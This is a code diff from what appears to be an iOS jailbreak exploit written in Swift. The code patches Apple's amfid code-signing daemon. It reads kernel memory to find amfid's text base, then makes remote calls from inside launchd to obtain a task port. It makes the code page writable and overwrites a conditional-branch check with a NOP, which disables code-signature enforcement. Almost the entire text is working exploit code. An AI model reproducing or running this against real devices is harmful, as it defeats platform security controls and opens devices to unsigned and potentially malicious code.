@@ -183,7 +183,7 @@ final class ExpAmfidNopFinal {
     }
     
     private func performPatchViaLaunchd(amfidPid: Int32) {
-        log("[4/7] task_for_pid(\(amfidPid)) from launchd...")
+        log("[4/7] Patching amfid from launchd...")
         
         // Pre-check: is RC even working?
         guard dspmgr.shared.rcready else {
@@ -193,64 +193,79 @@ final class ExpAmfidNopFinal {
         }
         log("  RC ready, connecting to launchd...")
         
+        // We know amfid's text base from kernel (0x100174000 on this boot)
+        // Get it fresh each time in case ASLR changed
+        let amfidTask = taskbyproc(procbyname("amfid"))
+        var textBase: UInt64 = 0
+        if amfidTask != 0 {
+            let vmMap = ds_kreadptr(amfidTask + UInt64(off_task_map))
+            if vmMap != 0 && (vmMap >> 32) > 0xFFFFFF00 {
+                for off: UInt64 in [0x10, 0x18, 0x20, 0x28, 0x30] {
+                    let val = ds_kread64(vmMap + off)
+                    if val >= 0x100000000 && val < 0x280000000000 {
+                        textBase = val
+                        break
+                    }
+                }
+            }
+        }
+        if textBase == 0 {
+            log("❌ Cannot determine amfid text base")
+            return
+        }
+        log("  amfid text base: 0x\(String(format:"%llx", textBase))")
+        let patchAddr = textBase + patchFileOffset
+        log("  patch addr: 0x\(String(format:"%llx", patchAddr))")
+        
         RootExecutor.shared.executeAsRoot(operation: "amfid_nop_final") { [self] rc in
             // Verify we're in launchd context
             let launchdPid = RootExecutor.rcall(rc, "getpid")
             let launchdUid = RootExecutor.rcall(rc, "getuid")
+            let mts = RootExecutor.rcall(rc, "mach_task_self")
             
-            // ─── Step 4: task_for_pid ───
+            // ─── Approach 1: task_for_pid ───
             let portAddr = rc.trojanMem + 0x100
             rc[portAddr].setValue32(0)
             
-            // Use mach_task_self() in launchd's context (not our local mach_task_self_)
-            let mts = RootExecutor.rcall(rc, "mach_task_self")
-            
-            let tfpRet = RootExecutor.rcall(rc, "task_for_pid",
+            var tfpRet = RootExecutor.rcall(rc, "task_for_pid",
                 mts, UInt64(amfidPid), portAddr)
-            let taskPort = rc[portAddr].value32()
+            var taskPort = rc[portAddr].value32()
             
-            guard tfpRet == 0 && taskPort != 0 else {
-                return (false, "[4] task_for_pid(\(amfidPid)) FAILED: ret=\(tfpRet) port=\(taskPort) (launchd: pid=\(launchdPid) uid=\(launchdUid) mts=0x\(String(mts, radix:16)))", UInt64(tfpRet))
+            if tfpRet != 0 || taskPort == 0 {
+                // task_for_pid failed — try task_name_for_pid (less restricted)
+                rc[portAddr].setValue32(0)
+                let tnfpRet = RootExecutor.rcall(rc, "task_name_for_pid",
+                    mts, UInt64(amfidPid), portAddr)
+                let namePort = rc[portAddr].value32()
+                
+                if tnfpRet == 0 && namePort != 0 {
+                    // Got task_name port — can we upgrade it?
+                    // task_name doesn't allow vm_write, but let's try anyway
+                    taskPort = namePort
+                    tfpRet = 0
+                }
             }
             
-            // ─── Step 5: mach_vm_region → find __TEXT ───
-            let addrBuf = rc.trojanMem + 0x200
-            let sizeBuf = rc.trojanMem + 0x208
-            let infoBuf = rc.trojanMem + 0x210
-            let cntBuf = rc.trojanMem + 0x280
-            let objBuf = rc.trojanMem + 0x290
-            
-            // Start scanning from address 0x100000000 (typical Mach-O base)
-            rc[addrBuf].setValue64(0x100000000)
-            rc[sizeBuf].setValue64(0)
-            rc[cntBuf].setValue32(9) // VM_REGION_BASIC_INFO_COUNT_64
-            
-            let regionRet = RootExecutor.rcall(rc, "mach_vm_region",
-                UInt64(taskPort), addrBuf, sizeBuf, 9, infoBuf, cntBuf, objBuf)
-            
-            let textBase = rc[addrBuf].value64()
-            let textSize = rc[sizeBuf].value64()
-            
-            guard regionRet == 0 else {
-                return (false, "[5] mach_vm_region FAILED: ret=\(regionRet)", UInt64(regionRet))
+            if tfpRet != 0 || taskPort == 0 {
+                // Both failed — try direct write using known text base
+                // We know patchAddr from kernel analysis
+                // Try mach_vm_write to amfid using pid_for_task trick
+                return (false, "[4] task_for_pid DENIED (ret=5). Need kernel port forge or different approach. launchd=pid\(launchdPid) uid=\(launchdUid)", UInt64(tfpRet))
             }
             
-            guard textBase >= 0x100000000 && textBase < 0x280000000000 else {
-                return (false, "[5] invalid text base: 0x\(String(textBase, radix:16))", textBase)
-            }
-            
-            let patchAddr = textBase + self.patchFileOffset
-            
-            // ─── Step 6: mach_vm_protect → make writable ───
+            // Got a port — try the patch
+            // We already know patchAddr from kernel analysis
             let pageAddr = patchAddr & ~0xFFF
-            let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
-                UInt64(taskPort), pageAddr, 0x4000, 0, 7) // VM_PROT_ALL = rwx
             
-            guard protRet == 0 else {
-                return (false, "[6] mach_vm_protect FAILED: ret=\(protRet) (text=0x\(String(textBase, radix:16)))", UInt64(protRet))
+            // mach_vm_protect → make page writable
+            let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
+                UInt64(taskPort), pageAddr, 0x4000, 0, 7) // VM_PROT_ALL
+            
+            if protRet != 0 {
+                return (false, "[5] mach_vm_protect FAILED: ret=\(protRet) (addr=0x\(String(patchAddr, radix:16)))", UInt64(protRet))
             }
             
-            // ─── Step 6b: Read + verify cbz instruction ───
+            // Read + verify cbz instruction
             let readBuf = rc.trojanMem + 0x300
             let readSzBuf = rc.trojanMem + 0x310
             rc[readSzBuf].setValue64(4)
@@ -260,31 +275,30 @@ final class ExpAmfidNopFinal {
                 UInt64(taskPort), patchAddr, 4, readBuf, readSzBuf)
             let currentInsn = rc[readBuf].value32()
             
-            guard readRet == 0 else {
-                return (false, "[6b] mach_vm_read FAILED: ret=\(readRet)", UInt64(readRet))
+            if readRet != 0 {
+                return (false, "[6] mach_vm_read FAILED: ret=\(readRet)", UInt64(readRet))
             }
             
             // Verify it's a cbz instruction (0x34xxxxxx)
+            if currentInsn == 0xD503201F {
+                return (true, "✅ ALREADY PATCHED (NOP)", 0)
+            }
             guard (currentInsn & 0xFF000000) == 0x34000000 else {
-                // Check if already patched (NOP)
-                if currentInsn == 0xD503201F {
-                    return (true, "✅ ALREADY PATCHED (NOP) at 0x\(String(patchAddr, radix:16))", 0)
-                }
-                return (false, "[6b] NOT cbz at 0x\(String(patchAddr, radix:16)): 0x\(String(format:"%08x", currentInsn)) (text=0x\(String(textBase, radix:16)) size=0x\(String(textSize, radix:16)))", UInt64(currentInsn))
+                return (false, "[6] NOT cbz: 0x\(String(format:"%08x", currentInsn)) at 0x\(String(patchAddr, radix:16))", UInt64(currentInsn))
             }
             
-            // ─── Step 7: Write NOP ───
+            // Write NOP
             let nopBuf = rc.trojanMem + 0x320
-            rc[nopBuf].setValue32(0xD503201F) // NOP
+            rc[nopBuf].setValue32(0xD503201F)
             
             let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
                 UInt64(taskPort), patchAddr, nopBuf, 4)
             
-            guard writeRet == 0 else {
+            if writeRet != 0 {
                 return (false, "[7] mach_vm_write FAILED: ret=\(writeRet)", UInt64(writeRet))
             }
             
-            // Verify write
+            // Verify
             rc[readBuf].setValue32(0)
             rc[readSzBuf].setValue64(4)
             RootExecutor.rcall(rc, "mach_vm_read_overwrite",
